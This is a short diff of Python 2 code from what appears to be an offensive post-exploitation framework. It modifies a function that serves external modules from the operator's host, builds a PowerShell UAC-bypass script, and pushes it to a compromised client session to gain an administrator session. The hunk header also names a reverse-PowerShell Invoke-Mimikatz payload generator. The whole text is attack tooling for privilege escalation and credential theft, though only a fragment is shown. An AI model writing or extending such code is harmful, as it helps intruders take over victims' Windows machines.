@@ -143,10 +143,10 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
 def UACBypassGeneration(payloadchoice,payloadname):
     moduleport = FUNCTIONS().randomUnusedPort()
     FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
-    encoded = printListener()
+    encoded = printListener(False)
     powershellScript = payloadchoice % (FUNCTIONS().CheckInternet(), moduleport, encoded)
-    print powershellScript
     clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
 
+    print t.bold_green + '\n[*] If UAC Bypass worked, expect a new admin session' + t.normal
 
     return "pass"
